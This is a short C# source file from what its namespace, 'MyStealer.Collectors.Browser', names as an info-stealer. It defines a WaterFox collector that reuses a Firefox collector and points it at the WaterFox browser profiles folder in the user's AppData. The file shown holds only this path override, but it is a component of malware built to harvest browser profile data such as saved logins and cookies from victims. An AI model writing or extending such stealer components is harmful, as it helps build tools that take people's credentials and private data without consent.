using System;
using System.IO;

namespace MyStealer.Collectors.Browser.FirefoxBased
{
    internal class WaterFox : Firefox
    {
        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WaterFox", "Profiles");
    }
}
